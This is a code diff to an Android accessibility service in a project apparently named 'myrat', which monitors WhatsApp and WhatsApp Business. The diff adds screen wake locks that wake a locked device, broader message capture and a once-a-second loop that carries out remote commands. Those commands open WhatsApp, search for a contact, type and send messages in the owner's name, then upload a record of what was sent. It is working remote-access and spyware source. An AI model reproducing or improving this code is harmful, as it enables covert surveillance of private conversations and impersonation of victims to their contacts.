@@ -2,6 +2,7 @@ package com.myrat.app.service
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
+import android.app.KeyguardManager
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.Context
@@ -34,44 +35,46 @@ class WhatsAppService : AccessibilityService() {
     private val NOTIFICATION_ID = 12
     private val CHANNEL_ID = "WhatsAppService"
     private var wakeLock: PowerManager.WakeLock? = null
+    private var screenWakeLock: PowerManager.WakeLock? = null
     private val handler = Handler(Looper.getMainLooper())
     private var lastNotificationTime = 0L
     private val pendingCommands = mutableListOf<SendCommand>()
+    private var isProcessingCommand = false
 
     companion object {
         const val WHATSAPP_PACKAGE = "com.whatsapp"
         const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"
         
-        // Enhanced view IDs for better compatibility
+        // Enhanced view IDs for better compatibility across WhatsApp versions
         private val MESSAGE_TEXT_IDS = listOf(
-            "message_text", "text_message", "message_body", "chat_message_text"
+            "message_text", "text_message", "message_body", "chat_message_text", "message_content"
         )
         private val CONVERSATION_LAYOUT_IDS = listOf(
-            "conversation_layout", "chat_layout", "conversation_container"
+            "conversation_layout", "chat_layout", "conversation_container", "chat_container"
         )
         private val CONVERSATIONS_ROW_IDS = listOf(
-            "conversations_row", "chat_row", "conversation_item"
+            "conversations_row", "chat_row", "conversation_item", "chat_item"
         )
         private val DATE_IDS = listOf(
-            "date", "time", "timestamp", "message_time"
+            "date", "time", "timestamp", "message_time", "message_timestamp"
         )
         private val OUTGOING_MSG_INDICATOR_IDS = listOf(
-            "outgoing_msg_indicator", "sent_indicator", "message_status"
+            "outgoing_msg_indicator", "sent_indicator", "message_status", "status_icon"
         )
         private val CONTACT_NAME_IDS = listOf(
-            "conversation_contact_name", "contact_name", "chat_title", "header_title"
+            "conversation_contact_name", "contact_name", "chat_title", "header_title", "toolbar_title"
         )
         private val SEARCH_IDS = listOf(
-            "menuitem_search", "search", "search_button"
+            "menuitem_search", "search", "search_button", "action_search"
         )
         private val SEARCH_INPUT_IDS = listOf(
-            "search_input", "search_field", "search_edit_text"
+            "search_input", "search_field", "search_edit_text", "search_src_text"
         )
         private val MESSAGE_ENTRY_IDS = listOf(
-            "entry", "message_entry", "input_message", "chat_input"
+            "entry", "message_entry", "input_message", "chat_input", "compose_text"
         )
         private val SEND_IDS = listOf(
-            "send", "send_button", "btn_send"
+            "send", "send_button", "btn_send", "voice_note_btn"
         )
     }
 
@@ -79,13 +82,14 @@ class WhatsAppService : AccessibilityService() {
         val number: String,
         val message: String,
         val packageName: String,
-        val timestamp: Long = System.currentTimeMillis()
+        val timestamp: Long = System.currentTimeMillis(),
+        val retryCount: Int = 0
     )
 
     override fun onCreate() {
         super.onCreate()
         try {
-            acquireWakeLock()
+            acquireWakeLocks()
             deviceId = MainActivity.getDeviceId(this)
             Logger.log("WhatsAppService started for deviceId: $deviceId")
             startForegroundService()
@@ -93,25 +97,33 @@ class WhatsAppService : AccessibilityService() {
             loadKnownContacts()
             scheduleCacheCleanup()
             listenForSendMessageCommands()
-            
-            // Monitor for WhatsApp notifications even when app is not open
             setupNotificationMonitoring()
+            setupCommandProcessor()
         } catch (e: Exception) {
             Logger.error("Failed to create WhatsAppService", e)
         }
     }
 
-    private fun acquireWakeLock() {
+    private fun acquireWakeLocks() {
         try {
             val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            
+            // Partial wake lock to keep CPU running
             wakeLock = powerManager.newWakeLock(
                 PowerManager.PARTIAL_WAKE_LOCK,
                 "WhatsAppService:KeepAlive"
             )
-            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
-            Logger.log("Wake lock acquired for WhatsAppService")
+            wakeLock?.acquire(60 * 60 * 1000L) // 1 hour
+            
+            // Screen wake lock for when we need to interact with UI
+            screenWakeLock = powerManager.newWakeLock(
+                PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
+                "WhatsAppService:ScreenWake"
+            )
+            
+            Logger.log("Wake locks acquired for WhatsAppService")
         } catch (e: Exception) {
-            Logger.error("Failed to acquire wake lock for WhatsApp", e)
+            Logger.error("Failed to acquire wake locks for WhatsApp", e)
         }
     }
 
@@ -120,7 +132,7 @@ class WhatsAppService : AccessibilityService() {
             val channelName = "WhatsApp Monitoring Service"
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 val channel = NotificationChannel(
-                    CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_MIN
+                    CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW
                 ).apply {
                     setShowBadge(false)
                     enableLights(false)
@@ -133,9 +145,9 @@ class WhatsAppService : AccessibilityService() {
 
             val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("WhatsApp Monitor")
-                .setContentText("Monitoring WhatsApp messages")
+                .setContentText("Monitoring WhatsApp messages and commands")
                 .setSmallIcon(R.drawable.ic_launcher_foreground)
-                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
                 .setSilent(true)
                 .setShowWhen(false)
                 .setOngoing(true)
@@ -151,41 +163,43 @@ class WhatsAppService : AccessibilityService() {
     private fun setupAccessibilityService() {
         try {
             val info = AccessibilityServiceInfo().apply {
-                // Enhanced event types for better message capture
+                // Enhanced event types for comprehensive message capture
                 eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_CLICKED or
-                        AccessibilityEvent.TYPE_VIEW_FOCUSED
+                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
+                        AccessibilityEvent.TYPE_VIEW_SELECTED
                         
                 feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                 flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                         AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
-                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
+                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
+                        AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY
                         
                 packageNames = arrayOf(WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE)
                 
-                // Capture events even when app is not in foreground
-                notificationTimeout = 100
+                // Minimal timeout for faster response
+                notificationTimeout = 50
             }
             serviceInfo = info
-            Logger.log("Accessibility service configured for background monitoring")
+            Logger.log("Accessibility service configured for comprehensive monitoring")
         } catch (e: Exception) {
             Logger.error("Failed to setup accessibility service", e)
         }
     }
 
     private fun setupNotificationMonitoring() {
-        // This will help capture messages from notifications even when app is not open
         scope.launch {
             while (isActive) {
                 try {
-                    // Check for WhatsApp notifications periodically
-                    delay(5000) // Check every 5 seconds
+                    delay(2000) // Check every 2 seconds
                     
                     // Process any pending send commands
-                    processPendingCommands()
+                    if (!isProcessingCommand && pendingCommands.isNotEmpty()) {
+                        processNextCommand()
+                    }
                     
                 } catch (e: Exception) {
                     Logger.error("Error in notification monitoring", e)
@@ -194,12 +208,76 @@ class WhatsAppService : AccessibilityService() {
         }
     }
 
-    private fun processPendingCommands() {
-        if (pendingCommands.isNotEmpty()) {
-            val command = pendingCommands.removeAt(0)
-            scope.launch {
-                sendWhatsAppMessage(command.number, command.message, command.packageName)
+    private fun setupCommandProcessor() {
+        scope.launch {
+            while (isActive) {
+                try {
+                    delay(1000) // Check every second for commands
+                    
+                    if (!isProcessingCommand && pendingCommands.isNotEmpty()) {
+                        processNextCommand()
+                    }
+                    
+                } catch (e: Exception) {
+                    Logger.error("Error in command processor", e)
+                }
             }
+        }
+    }
+
+    private suspend fun processNextCommand() {
+        if (isProcessingCommand || pendingCommands.isEmpty()) return
+        
+        isProcessingCommand = true
+        try {
+            val command = pendingCommands.removeAt(0)
+            Logger.log("Processing WhatsApp command: ${command.number} - ${command.message}")
+            
+            // Wake up screen if needed for UI interaction
+            wakeUpScreen()
+            
+            sendWhatsAppMessage(command.number, command.message, command.packageName)
+            
+            delay(2000) // Wait between commands
+        } catch (e: Exception) {
+            Logger.error("Error processing command", e)
+        } finally {
+            isProcessingCommand = false
+        }
+    }
+
+    private fun wakeUpScreen() {
+        try {
+            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            
+            // Check if screen is off or device is locked
+            if (!powerManager.isInteractive || keyguardManager.isKeyguardLocked) {
+                Logger.log("Waking up screen for WhatsApp interaction")
+                
+                screenWakeLock?.let { wakeLock ->
+                    if (!wakeLock.isHeld) {
+                        wakeLock.acquire(30000) // 30 seconds
+                        Logger.log("Screen wake lock acquired")
+                    }
+                }
+                
+                // Additional wake up methods for different Android versions
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
+                    // For newer Android versions
+                    try {
+                        val intent = Intent(Intent.ACTION_MAIN).apply {
+                            addCategory(Intent.CATEGORY_HOME)
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
+                        startActivity(intent)
+                    } catch (e: Exception) {
+                        Logger.error("Failed to wake screen with intent", e)
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Logger.error("Error waking up screen", e)
         }
     }
 
@@ -466,18 +544,10 @@ class WhatsAppService : AccessibilityService() {
 
     private fun parseTimestamp(timestampStr: String?): Long {
         return try {
-            // Enhanced timestamp parsing
             timestampStr?.let {
-                // Try to parse common time formats
                 when {
-                    it.contains(":") -> {
-                        // Time format like "10:30 AM" or "22:30"
-                        System.currentTimeMillis()
-                    }
-                    it.matches(Regex("\\d+")) -> {
-                        // Unix timestamp
-                        it.toLongOrNull() ?: System.currentTimeMillis()
-                    }
+                    it.contains(":") -> System.currentTimeMillis()
+                    it.matches(Regex("\\d+")) -> it.toLongOrNull() ?: System.currentTimeMillis()
                     else -> System.currentTimeMillis()
                 }
             } ?: System.currentTimeMillis()
@@ -629,123 +699,193 @@ class WhatsAppService : AccessibilityService() {
 
     private suspend fun sendWhatsAppMessage(recipient: String, message: String, packageName: String) {
         try {
-            Logger.log("Starting to send message to $recipient via $packageName")
+            Logger.log("Starting to send message to $recipient via $packageName (Background mode)")
+            
+            // Ensure screen is awake for UI interaction
+            wakeUpScreen()
+            delay(1000)
             
             // Open WhatsApp or WhatsApp Business
             val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
             } ?: run {
                 Logger.error("$packageName not installed")
                 return
             }
             
             startActivity(intent)
-            delay(3000) // Wait for app to load
+            delay(4000) // Wait longer for app to load in background
 
-            // Step 1: Find and click search
-            var rootNode = rootInActiveWindow
-            var searchButton: AccessibilityNodeInfo? = null
+            // Retry mechanism for each step
+            var success = false
             
-            for (attempt in 1..3) {
-                rootNode = rootInActiveWindow
+            // Step 1: Find and click search (with retries)
+            for (searchAttempt in 1..5) {
+                val rootNode = rootInActiveWindow
                 if (rootNode != null) {
-                    searchButton = SEARCH_IDS.mapNotNull { id ->
+                    val searchButton = SEARCH_IDS.mapNotNull { id ->
                         rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                     }.firstOrNull()
                     
-                    if (searchButton != null) break
+                    if (searchButton != null) {
+                        searchButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        Logger.log("Search button clicked (attempt $searchAttempt)")
+                        success = true
+                        break
+                    }
                 }
-                delay(1000)
+                delay(1500)
             }
             
-            if (searchButton == null) {
-                Logger.error("Search button not found ($packageName)")
+            if (!success) {
+                Logger.error("Search button not found after 5 attempts ($packageName)")
                 return
             }
             
-            searchButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-            delay(1500)
-
-            // Step 2: Enter recipient in search field
-            rootNode = rootInActiveWindow
-            val searchField = SEARCH_INPUT_IDS.mapNotNull { id ->
-                rootNode?.findAccessibilityNodeInfosByViewId("$packageName:id/$id")?.firstOrNull()
-            }.firstOrNull()
-            
-            if (searchField == null) {
-                Logger.error("Search field not found ($packageName)")
-                return
-            }
-            
-            val args = Bundle().apply {
-                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, recipient)
-            }
-            searchField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
             delay(2000)
 
-            // Step 3: Click on the contact result
-            rootNode = rootInActiveWindow
-            val contactResult = CONTACT_NAME_IDS.mapNotNull { id ->
-                rootNode?.findAccessibilityNodeInfosByViewId("$packageName:id/$id")?.firstOrNull()
-            }.firstOrNull()
+            // Step 2: Enter recipient in search field (with retries)
+            success = false
+            for (searchFieldAttempt in 1..5) {
+                val rootNode = rootInActiveWindow
+                if (rootNode != null) {
+                    val searchField = SEARCH_INPUT_IDS.mapNotNull { id ->
+                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
+                    }.firstOrNull()
+                    
+                    if (searchField != null) {
+                        val args = Bundle().apply {
+                            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, recipient)
+                        }
+                        searchField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
+                        Logger.log("Search field filled with recipient (attempt $searchFieldAttempt)")
+                        success = true
+                        break
+                    }
+                }
+                delay(1500)
+            }
             
-            if (contactResult == null) {
-                Logger.error("Contact result not found for $recipient ($packageName)")
+            if (!success) {
+                Logger.error("Search field not found after 5 attempts ($packageName)")
                 return
             }
             
-            contactResult.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+            delay(3000)
+
+            // Step 3: Click on the contact result (with retries)
+            success = false
+            for (contactAttempt in 1..5) {
+                val rootNode = rootInActiveWindow
+                if (rootNode != null) {
+                    val contactResult = CONTACT_NAME_IDS.mapNotNull { id ->
+                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
+                    }.firstOrNull()
+                    
+                    if (contactResult != null) {
+                        contactResult.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        Logger.log("Contact result clicked (attempt $contactAttempt)")
+                        success = true
+                        break
+                    }
+                }
+                delay(1500)
+            }
+            
+            if (!success) {
+                Logger.error("Contact result not found for $recipient after 5 attempts ($packageName)")
+                return
+            }
+            
+            delay(3000)
+
+            // Step 4: Enter message in input field (with retries)
+            success = false
+            for (messageAttempt in 1..5) {
+                val rootNode = rootInActiveWindow
+                if (rootNode != null) {
+                    val messageInput = MESSAGE_ENTRY_IDS.mapNotNull { id ->
+                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
+                    }.firstOrNull()
+                    
+                    if (messageInput != null) {
+                        val messageArgs = Bundle().apply {
+                            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, message)
+                        }
+                        messageInput.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, messageArgs)
+                        Logger.log("Message input filled (attempt $messageAttempt)")
+                        success = true
+                        break
+                    }
+                }
+                delay(1500)
+            }
+            
+            if (!success) {
+                Logger.error("Message input not found after 5 attempts ($packageName)")
+                return
+            }
+            
             delay(2000)
 
-            // Step 4: Enter message in input field
-            rootNode = rootInActiveWindow
-            val messageInput = MESSAGE_ENTRY_IDS.mapNotNull { id ->
-                rootNode?.findAccessibilityNodeInfosByViewId("$packageName:id/$id")?.firstOrNull()
-            }.firstOrNull()
-            
-            if (messageInput == null) {
-                Logger.error("Message input not found ($packageName)")
-                return
+            // Step 5: Click send button (with retries)
+            success = false
+            for (sendAttempt in 1..5) {
+                val rootNode = rootInActiveWindow
+                if (rootNode != null) {
+                    val sendButton = SEND_IDS.mapNotNull { id ->
+                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
+                    }.firstOrNull()
+                    
+                    if (sendButton != null) {
+                        sendButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        Logger.log("Send button clicked (attempt $sendAttempt)")
+                        success = true
+                        break
+                    }
+                }
+                delay(1500)
             }
             
-            val messageArgs = Bundle().apply {
-                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, message)
-            }
-            messageInput.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, messageArgs)
-            delay(1000)
+            if (success) {
+                Logger.log("Successfully sent message to $recipient ($packageName) in background")
 
-            // Step 5: Click send button
-            rootNode = rootInActiveWindow
-            val sendButton = SEND_IDS.mapNotNull { id ->
-                rootNode?.findAccessibilityNodeInfosByViewId("$packageName:id/$id")?.firstOrNull()
-            }.firstOrNull()
-            
-            if (sendButton == null) {
-                Logger.error("Send button not found ($packageName)")
-                return
+                // Log sent message with unique ID to prevent duplicates
+                val messageData = mapOf(
+                    "sender" to "You",
+                    "recipient" to recipient,
+                    "content" to message,
+                    "timestamp" to System.currentTimeMillis(),
+                    "type" to "Sent",
+                    "isNewContact" to !contactCache.containsKey(recipient),
+                    "uploaded" to System.currentTimeMillis(),
+                    "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName, "Sent"),
+                    "packageName" to packageName,
+                    "direction" to "Sent",
+                    "source" to "command"
+                )
+                uploadMessage(messageData)
+            } else {
+                Logger.error("Send button not found after 5 attempts ($packageName)")
             }
             
-            sendButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-            Logger.log("Successfully sent message to $recipient ($packageName)")
-
-            // Log sent message with unique ID to prevent duplicates
-            val messageData = mapOf(
-                "sender" to "You",
-                "recipient" to recipient,
-                "content" to message,
-                "timestamp" to System.currentTimeMillis(),
-                "type" to "Sent",
-                "isNewContact" to !contactCache.containsKey(recipient),
-                "uploaded" to System.currentTimeMillis(),
-                "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName, "Sent"),
-                "packageName" to packageName,
-                "direction" to "Sent",
-                "source" to "command"
-            )
-            uploadMessage(messageData)
+            // Release screen wake lock after sending
+            screenWakeLock?.let { wakeLock ->
+                if (wakeLock.isHeld) {
+                    wakeLock.release()
+                    Logger.log("Screen wake lock released after sending")
+                }
+            }
             
         } catch (e: Exception) {
             Logger.error("Error sending message ($packageName): ${e.message}", e)
+            
+            // Release screen wake lock on error
+            screenWakeLock?.let { wakeLock ->
+                if (wakeLock.isHeld) {
+                    wakeLock.release()
+                }
+            }
         }
     }
 
@@ -756,8 +896,13 @@ class WhatsAppService : AccessibilityService() {
     override fun onDestroy() {
         super.onDestroy()
         try {
-            // Release wake lock
+            // Release wake locks
             wakeLock?.let {
+                if (it.isHeld) {
+                    it.release()
+                }
+            }
+            screenWakeLock?.let {
                 if (it.isHeld) {
                     it.release()
                 }
